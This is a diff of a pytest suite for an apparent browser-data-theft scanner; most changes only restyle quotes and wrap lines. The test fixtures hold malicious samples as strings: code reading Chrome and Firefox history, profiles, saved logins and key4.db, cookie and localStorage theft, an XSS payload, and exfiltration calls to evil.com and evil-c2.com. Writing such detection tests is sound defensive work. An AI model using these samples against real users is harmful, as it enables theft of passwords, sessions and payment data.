@@ -27,7 +27,7 @@ class TestBrowserTheftAnalyzer:
 
     def test_browser_history_file_access_detection(self, analyzer):
         """Test detection of browser history file access."""
-        content = '''
+        content = """
 import sqlite3
 import os
 
@@ -35,13 +35,13 @@ import os
 def steal_browser_history():
     chrome_path = os.path.expanduser("~/.config/google-chrome/Default/History")
     firefox_path = os.path.expanduser("~/.mozilla/firefox/*/places.sqlite")
-    
+
     conn = sqlite3.connect(chrome_path)
     cursor = conn.cursor()
     cursor.execute("SELECT url, title, visit_count FROM urls")
-    
+
     return cursor.fetchall()
-        '''
+        """
 
         with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
             f.write(content)
@@ -55,23 +55,26 @@ def steal_browser_history():
 
             finding = history_findings[0]
             assert finding.severity == Severity.HIGH
-            assert "history" in finding.metadata["matched_text"].lower() or "places.sqlite" in finding.metadata["matched_text"].lower()
+            matched_text = finding.metadata["matched_text"].lower()
+            assert "history" in matched_text or "places.sqlite" in matched_text
 
     def test_browser_profile_directory_access(self, analyzer):
         """Test detection of browser profile directory access."""
-        content = '''
+        content = """
 import os
 import shutil
 
 def steal_browser_data():
     # Access Chrome user data
-    chrome_profile = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default")
+    chrome_profile = os.path.expanduser(
+        "~/Library/Application Support/Google/Chrome/Default"
+    )
     firefox_profile = os.path.expanduser("~/.mozilla/firefox/")
-    
+
     # Copy browser profiles
     shutil.copytree(chrome_profile, "/tmp/stolen_chrome")
     shutil.copytree(firefox_profile, "/tmp/stolen_firefox")
-        '''
+        """
 
         with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
             f.write(content)
@@ -85,35 +88,38 @@ def steal_browser_data():
 
             finding = profile_findings[0]
             assert finding.severity == Severity.HIGH
-            assert "chrome" in finding.metadata["matched_text"].lower() or "firefox" in finding.metadata["matched_text"].lower()
+            matched_text = finding.metadata["matched_text"].lower()
+            assert "chrome" in matched_text or "firefox" in matched_text
 
     def test_browser_password_extraction(self, analyzer):
         """Test detection of browser password extraction."""
-        content = '''
+        content = """
 import win32crypt
 import sqlite3
 import json
 
 def steal_chrome_passwords():
     # Access Chrome login data
-    login_data_path = os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Login Data")
-    
+    login_data_path = os.path.expanduser(
+        "~/AppData/Local/Google/Chrome/User Data/Default/Login Data"
+    )
+
     conn = sqlite3.connect(login_data_path)
     cursor = conn.cursor()
     cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-    
+
     for row in cursor.fetchall():
         encrypted_password = row[2]
         # Decrypt using CryptUnprotectData
         decrypted_password = win32crypt.CryptUnprotectData(encrypted_password)
-        
+
     return passwords
 
 def steal_firefox_passwords():
     # Access Firefox login data
     key4_db = os.path.expanduser("~/.mozilla/firefox/*/key4.db")
     logins_json = os.path.expanduser("~/.mozilla/firefox/*/logins.json")
-        '''
+        """
 
         with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
             f.write(content)
@@ -122,45 +128,56 @@ def steal_firefox_passwords():
             findings = analyzer.analyze_file(Path(f.name))
 
             # Should find password extraction attempts
-            password_findings = [f for f in findings if "BROWSER_PASSWORD_EXTRACTION" in f.id]
+            password_findings = [
+                f for f in findings if "BROWSER_PASSWORD_EXTRACTION" in f.id
+            ]
             assert len(password_findings) >= 1
 
             # Check if any finding has the expected keywords
             found_keywords = False
             for finding in password_findings:
-                if any(keyword.lower() in finding.metadata["matched_text"].lower() for keyword in
-                      ["Login Data", "key4.db", "CryptUnprotectData", "logins.json"]):
+                matched_text = finding.metadata["matched_text"].lower()
+                keywords = [
+                    "Login Data",
+                    "key4.db",
+                    "CryptUnprotectData",
+                    "logins.json",
+                ]
+                if any(keyword.lower() in matched_text for keyword in keywords):
                     found_keywords = True
                     assert finding.severity == Severity.CRITICAL
                     break
 
-            assert found_keywords, f"No password findings contained expected keywords. Found: {[f.metadata['matched_text'] for f in password_findings]}"
+            assert found_keywords, (
+                f"No password findings contained expected keywords. "
+                f"Found: {[f.metadata['matched_text'] for f in password_findings]}"
+            )
 
     def test_browser_storage_manipulation(self, analyzer):
         """Test detection of browser storage manipulation (JavaScript)."""
-        content = '''
+        content = """
 // Malicious JavaScript to steal localStorage data
 function stealBrowserData() {
     var stolenData = {};
-    
+
     // Steal localStorage
     for (var i = 0; i < localStorage.length; i++) {
         var key = localStorage.key(i);
         stolenData[key] = localStorage.getItem(key);
     }
-    
+
     // Steal sessionStorage
     for (var i = 0; i < sessionStorage.length; i++) {
         var key = sessionStorage.key(i);
         stolenData[key] = sessionStorage.getItem(key);
     }
-    
+
     // Access indexedDB
     var request = indexedDB.open("userDB", 1);
-    
+
     return stolenData;
 }
-        '''
+        """
 
         with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
             f.write(content)
@@ -174,22 +191,23 @@ function stealBrowserData() {
 
             finding = storage_findings[0]
             assert finding.severity == Severity.MEDIUM
-            assert any(keyword.lower() in finding.metadata["matched_text"].lower() for keyword in
-                      ["localStorage", "sessionStorage", "indexedDB"])
+            matched_text = finding.metadata["matched_text"].lower()
+            keywords = ["localStorage", "sessionStorage", "indexedDB"]
+            assert any(keyword.lower() in matched_text for keyword in keywords)
 
     def test_browser_session_hijacking(self, analyzer):
         """Test detection of browser session hijacking."""
-        content = '''
+        content = """
 // Steal cookies and session tokens
 function hijackSession() {
     // Get all cookies
     var cookies = document.cookie;
-    
+
     // Look for session tokens
     var sessionToken = getCookie("JSESSIONID");
     var phpSession = getCookie("PHPSESSID");
     var aspSession = getCookie("ASP.NET_SessionId");
-    
+
     // Send to attacker server
     fetch("http://malicious-server.com/steal", {
         method: "POST",
@@ -209,7 +227,7 @@ function getCookie(name) {
     var parts = value.split("; " + name + "=");
     if (parts.length == 2) return parts.pop().split(";").shift();
 }
-        '''
+        """
 
         with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
             f.write(content)
@@ -224,17 +242,26 @@ function getCookie(name) {
             # Check if any finding has the expected keywords
             found_keywords = False
             for finding in session_findings:
-                if any(keyword.lower() in finding.metadata["matched_text"].lower() for keyword in
-                      ["document.cookie", "JSESSIONID", "PHPSESSID", "ASP.NET_SessionId"]):
+                matched_text = finding.metadata["matched_text"].lower()
+                keywords = [
+                    "document.cookie",
+                    "JSESSIONID",
+                    "PHPSESSID",
+                    "ASP.NET_SessionId",
+                ]
+                if any(keyword.lower() in matched_text for keyword in keywords):
                     found_keywords = True
                     assert finding.severity == Severity.CRITICAL
                     break
 
-            assert found_keywords, f"No session findings contained expected keywords. Found: {[f.metadata['matched_text'] for f in session_findings]}"
+            assert found_keywords, (
+                f"No session findings contained expected keywords. "
+                f"Found: {[f.metadata['matched_text'] for f in session_findings]}"
+            )
 
     def test_xss_payload_detection(self, analyzer):
         """Test detection of XSS payloads for browser data theft."""
-        content = '''
+        content = """
 <script>
     // XSS payload to steal browser data
     var stolen = {
@@ -242,14 +269,14 @@ function getCookie(name) {
         localStorage: JSON.stringify(localStorage),
         sessionStorage: JSON.stringify(sessionStorage)
     };
-    
+
     // Exfiltrate data
     var img = new Image();
     img.src = "http://evil.com/steal?data=" + btoa(JSON.stringify(stolen));
 </script>
 
 <script>document.cookie + localStorage.getItem("token")</script>
-        '''
+        """
 
         with tempfile.NamedTemporaryFile(mode="w", suffix=".html", delete=False) as f:
             f.write(content)
@@ -267,17 +294,18 @@ function getCookie(name) {
 
     def test_browser_extension_manipulation(self, analyzer):
         """Test detection of browser extension manipulation."""
-        content = '''
+        content = """
 // Malicious extension injection
 function injectMaliciousExtension() {
     // Access Chrome extension APIs
     if (chrome.extension) {
         chrome.extension.sendMessage({type: "steal_data"});
     }
-    
+
     // Manipulate extensions directory
-    var extensionsPath = "~/Library/Application Support/Google/Chrome/Default/Extensions/";
-    
+    var extensionsPath = "~/Library/Application Support/Google/Chrome/Default/"
+                       + "Extensions/";
+
     // Install malicious extension
     chrome.management.install({
         url: "http://malicious-site.com/evil-extension.crx"
@@ -286,7 +314,7 @@ function injectMaliciousExtension() {
 
 // Firefox extension manipulation
 browser.extension.getURL("manifest.json");
-        '''
+        """
 
         with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
             f.write(content)
@@ -295,17 +323,25 @@ browser.extension.getURL("manifest.json");
             findings = analyzer.analyze_file(Path(f.name))
 
             # Should find extension manipulation
-            extension_findings = [f for f in findings if "BROWSER_EXTENSION_INJECT" in f.id]
+            extension_findings = [
+                f for f in findings if "BROWSER_EXTENSION_INJECT" in f.id
+            ]
             assert len(extension_findings) >= 1
 
             finding = extension_findings[0]
             assert finding.severity == Severity.HIGH
-            assert any(keyword.lower() in finding.metadata["matched_text"].lower() for keyword in
-                      ["chrome.extension", "browser.extension", "Extensions", "manifest.json"])
+            matched_text = finding.metadata["matched_text"].lower()
+            keywords = [
+                "chrome.extension",
+                "browser.extension",
+                "Extensions",
+                "manifest.json",
+            ]
+            assert any(keyword.lower() in matched_text for keyword in keywords)
 
     def test_browser_data_exfiltration(self, analyzer):
         """Test detection of browser data exfiltration."""
-        content = '''
+        content = """
 import requests
 import json
 
@@ -317,14 +353,14 @@ def exfiltrate_browser_data():
         "passwords": get_stolen_passwords(),
         "tokens": get_stolen_tokens()
     }
-    
+
     # Send to command & control server
-    response = requests.post("http://evil-c2.com/collect", 
+    response = requests.post("http://evil-c2.com/collect",
                            data=json.dumps(stolen_data),
                            headers={"Content-Type": "application/json"})
-    
+
     # Also use urllib for redundancy
-    urllib.request.urlopen("http://backup-c2.com/data", 
+    urllib.request.urlopen("http://backup-c2.com/data",
                           data=json.dumps(stolen_data).encode())
 
 async function exfiltrateJS() {
@@ -332,13 +368,13 @@ async function exfiltrateJS() {
         cookies: document.cookie,
         credentials: await getStoredCredentials()
     };
-    
+
     fetch("http://evil.com/steal", {
         method: "POST",
         body: JSON.stringify(data)
     });
 }
-        '''
+        """
 
         with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
             f.write(content)
@@ -347,7 +383,9 @@ async function exfiltrateJS() {
             findings = analyzer.analyze_file(Path(f.name))
 
             # Should find data exfiltration
-            exfil_findings = [f for f in findings if "BROWSER_DATA_EXFILTRATION" in f.id]
+            exfil_findings = [
+                f for f in findings if "BROWSER_DATA_EXFILTRATION" in f.id
+            ]
             assert len(exfil_findings) >= 1
 
             finding = exfil_findings[0]
@@ -365,12 +403,12 @@ def steal_with_automation():
     options = webdriver.ChromeOptions()
     options.add_argument("--headless")
     options.add_argument("--user-data-dir=/path/to/user/profile")
-    
+
     driver = webdriver.Chrome(options=options)
-    
+
     # Navigate to banking site with saved credentials
     driver.get("https://bank.com/login")
-    
+
     # Extract saved passwords from the browser
     driver.execute_script("""
         var passwords = [];
@@ -380,13 +418,13 @@ def steal_with_automation():
         });
         return passwords;
     """)
-    
+
     # Steal localStorage data
     local_storage = driver.execute_script("return JSON.stringify(localStorage);")
-    
+
     # Steal cookies
     cookies = driver.get_cookies()
-    
+
     driver.quit()
     return {"passwords": passwords, "localStorage": local_storage, "cookies": cookies}
         '''
@@ -398,7 +436,9 @@ def steal_with_automation():
             findings = analyzer.analyze_file(Path(f.name))
 
             # Should find automation abuse
-            automation_findings = [f for f in findings if "BROWSER_AUTOMATION_ABUSE" in f.id]
+            automation_findings = [
+                f for f in findings if "BROWSER_AUTOMATION_ABUSE" in f.id
+            ]
             assert len(automation_findings) >= 1
 
             finding = automation_findings[0]
@@ -406,21 +446,21 @@ def steal_with_automation():
 
     def test_browser_cache_access(self, analyzer):
         """Test detection of browser cache access."""
-        content = '''
+        content = """
 import os
 import shutil
 
 def steal_browser_cache():
     # Access Chrome cache
     chrome_cache = os.path.expanduser("~/Library/Caches/Google/Chrome/Default/Cache")
-    
+
     # Access Firefox cache
     firefox_cache = os.path.expanduser("~/Library/Caches/Firefox/Profiles/*/cache2")
-    
+
     # Copy cache files
     shutil.copytree(chrome_cache, "/tmp/stolen_cache/chrome")
     shutil.copytree(firefox_cache, "/tmp/stolen_cache/firefox")
-        '''
+        """
 
         with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
             f.write(content)
@@ -437,16 +477,16 @@ def steal_browser_cache():
 
     def test_form_data_theft(self, analyzer):
         """Test detection of browser form data theft."""
-        content = '''
+        content = """
 // Steal autofill and form data
 function stealFormData() {
     // Access autofill data
     var autofillData = getAutofillData();
-    
+
     // Steal saved form values
     var forms = document.querySelectorAll('form');
     var formData = {};
-    
+
     forms.forEach(function(form) {
         var inputs = form.querySelectorAll('input');
         inputs.forEach(function(input) {
@@ -455,22 +495,22 @@ function stealFormData() {
             }
         });
     });
-    
+
     // Look for credit card data
     var creditCardInputs = document.querySelectorAll('input[autocomplete*="cc-"]');
     var paymentInfo = {};
-    
+
     creditCardInputs.forEach(function(input) {
         paymentInfo[input.autocomplete] = input.value;
     });
-    
+
     return {
         autofill: autofillData,
         forms: formData,
         payment: paymentInfo
     };
 }
-        '''
+        """
 
         with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
             f.write(content)
@@ -498,10 +538,10 @@ function stealFormData() {
         }
         analyzer_no_history = BrowserTheftAnalyzer(config_no_history)
 
-        content = '''
+        content = """
         chrome_path = "~/.config/google-chrome/Default/History"
         localStorage.getItem("token")
-        '''
+        """
 
         with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
             f.write(content)
@@ -519,17 +559,17 @@ function stealFormData() {
 
     def test_false_positive_reduction(self, analyzer):
         """Test that legitimate browser API usage doesn't trigger false positives."""
-        content = '''
+        content = """
 // Legitimate browser API usage
 function saveUserPreferences() {
     // Save user settings to localStorage (legitimate use)
     localStorage.setItem("theme", "dark");
     localStorage.setItem("language", "en");
-    
+
     // Get user preferences (legitimate use)
     var theme = localStorage.getItem("theme");
     var lang = localStorage.getItem("language");
-    
+
     return {theme: theme, language: lang};
 }
 
@@ -538,7 +578,7 @@ function setAuthCookie() {
     // Set authentication cookie (legitimate)
     document.cookie = "auth_token=abc123; path=/; secure; httponly";
 }
-        '''
+        """
 
         with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
             f.write(content)
@@ -552,23 +592,27 @@ function setAuthCookie() {
             session_findings = [f for f in findings if "BROWSER_SESSION_HIJACK" in f.id]
 
             # These are detected but should be reviewed in context
-            assert len(storage_findings) >= 0  # May or may not detect depending on pattern specificity
-            assert len(session_findings) >= 0  # May or may not detect depending on pattern specificity
+            # May or may not detect depending on pattern specificity
+            assert len(storage_findings) >= 0
+            # May or may not detect depending on pattern specificity
+            assert len(session_findings) >= 0
 
     def test_multiple_file_types(self, analyzer):
         """Test detection across different file types."""
         test_cases = [
             (".py", 'history_path = "~/.config/google-chrome/Default/History"'),
-            (".js", 'var cookies = document.cookie;'),
+            (".js", "var cookies = document.cookie;"),
             (".ts", 'const storage = localStorage.getItem("token");'),
-            (".sh", 'cp ~/.mozilla/firefox/*/places.sqlite /tmp/'),
+            (".sh", "cp ~/.mozilla/firefox/*/places.sqlite /tmp/"),
             (".php", '$cookies = $_COOKIE["PHPSESSID"];'),
         ]
 
         total_findings = 0
 
         for suffix, content in test_cases:
-            with tempfile.NamedTemporaryFile(mode="w", suffix=suffix, delete=False) as f:
+            with tempfile.NamedTemporaryFile(
+                mode="w", suffix=suffix, delete=False
+            ) as f:
                 f.write(content)
                 f.flush()
 
@@ -595,9 +639,9 @@ function setAuthCookie() {
 
     def test_remediation_advice(self, analyzer):
         """Test that findings include appropriate remediation advice."""
-        content = '''
+        content = """
         login_data_path = "~/Chrome/Default/Login Data"
-        '''
+        """
 
         with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
             f.write(content)
@@ -611,14 +655,16 @@ function setAuthCookie() {
             for finding in findings:
                 assert finding.remediation is not None
                 assert len(finding.remediation) > 10  # Should have meaningful advice
-                assert any(keyword in finding.remediation.lower() for keyword in
-                          ["remove", "avoid", "implement", "use", "ensure"])
+                assert any(
+                    keyword in finding.remediation.lower()
+                    for keyword in ["remove", "avoid", "implement", "use", "ensure"]
+                )
 
     def test_metadata_and_tags(self, analyzer):
         """Test that findings include proper metadata and tags."""
-        content = '''
+        content = """
         chrome_history = "~/.config/google-chrome/Default/History"
-        '''
+        """
 
         with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
             f.write(content)
